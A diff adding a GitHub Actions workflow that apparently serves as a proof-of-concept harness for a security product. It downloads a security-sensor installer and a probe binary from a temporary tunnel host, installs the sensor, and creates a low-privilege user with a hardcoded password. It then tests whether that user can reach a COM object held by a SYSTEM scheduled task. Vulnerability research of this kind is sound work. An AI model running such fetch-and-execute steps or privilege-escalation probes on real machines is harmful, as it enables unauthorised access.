@@ -1,0 +1,69 @@
+name: csps4-exact-current-access-proof
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  proof:
+    runs-on: windows-2022
+    timeout-minutes: 25
+    steps:
+      - name: Download exact inputs
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Stop'
+          New-Item -ItemType Directory -Force C:\proof | Out-Null
+          Invoke-WebRequest -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/FalconSensor.exe' -OutFile C:\proof\FalconSensor.exe
+          Invoke-WebRequest -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/csps4_probe.exe' -OutFile C:\proof\csps4_probe.exe
+          $ih=(Get-FileHash C:\proof\FalconSensor.exe -Algorithm SHA256).Hash.ToLower()
+          $ph=(Get-FileHash C:\proof\csps4_probe.exe -Algorithm SHA256).Hash.ToLower()
+          Write-Host "installer=$ih probe=$ph"
+          if($ih -ne '61737e34ba440128c1deedef8cdf72ee002693db8a25cca922cad58eba28a0b4'){throw 'installer hash mismatch'}
+          if($ph -ne '3c2ba3f64589a2aa7eb11e34c8483ab0cbb70f6503e6844ad4d6fc4480073d95'){throw 'probe hash mismatch'}
+      - name: Install exact sensor
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $p=Start-Process C:\proof\FalconSensor.exe -ArgumentList '/install /quiet /norestart CID=00000000000000000000000000000000-00 ProvWaitTime=1' -Wait -PassThru
+          Write-Host "installer_exit=$($p.ExitCode)"
+          Start-Sleep 20
+          Get-Service | Where-Object {$_.Name -match 'CSFalcon'} | Format-Table -AutoSize
+          reg query 'HKCR\CLSID\{BD07DDB9-1C61-4DCE-9202-A2BA1757CDB2}' /s
+          reg query 'HKCR\AppID' /f '{BD07DDB9-1C61-4DCE-9202-A2BA1757CDB2}' /s
+      - name: Access-control proof
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $pw='CsPs4-Proof-2026!'
+          net user csps4low $pw /add
+          $secure=ConvertTo-SecureString $pw -AsPlainText -Force
+          $cred=[pscredential]::new("$env:COMPUTERNAME\csps4low",$secure)
+          # Negative control: low user cannot launch the LocalSystem-only surrogate.
+          $pre=Start-Process C:\proof\csps4_probe.exe -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-pre.txt -RedirectStandardError C:\proof\low-pre.err
+          Write-Host "low_pre_exit=$($pre.ExitCode)"; Get-Content C:\proof\low-pre.txt; Get-Content C:\proof\low-pre.err
+          # Positive control: SYSTEM launches and holds the COM object in its surrogate.
+          $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
+          $act=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c C:\proof\csps4_probe.exe hold ^> C:\proof\system-hold.txt 2^>^&1'
+          Register-ScheduledTask -TaskName CsPs4SystemHolder -Action $act -Trigger $trigger -User SYSTEM -RunLevel Highest -Force | Out-Null
+          Start-ScheduledTask CsPs4SystemHolder
+          Start-Sleep 15
+          Write-Host '--- system holder ---'; Get-Content C:\proof\system-hold.txt
+          Write-Host '--- dllhost processes ---'
+          Get-CimInstance Win32_Process -Filter "Name='dllhost.exe'" | ForEach-Object { $o=Invoke-CimMethod -InputObject $_ -MethodName GetOwner; [pscustomobject]@{PID=$_.ProcessId;Parent=$_.ParentProcessId;Owner="$($o.Domain)\$($o.User)";Command=$_.CommandLine} } | Format-List
+          # Decisive test: same low user attempts the same CoCreate against running SYSTEM surrogate.
+          $post=Start-Process C:\proof\csps4_probe.exe -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-post.txt -RedirectStandardError C:\proof\low-post.err
+          Write-Host "low_post_exit=$($post.ExitCode)"; Get-Content C:\proof\low-post.txt; Get-Content C:\proof\low-post.err
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: csps4-access-proof
+          path: C:\proof\*.txt
+          if-no-files-found: warn
+      - name: Cleanup
+        if: always()
+        shell: pwsh
+        run: |
+          Unregister-ScheduledTask CsPs4SystemHolder -Confirm:$false -ErrorAction SilentlyContinue
+          Stop-Process -Name csps4_probe -Force -ErrorAction SilentlyContinue
+          Remove-LocalUser csps4low -ErrorAction SilentlyContinue
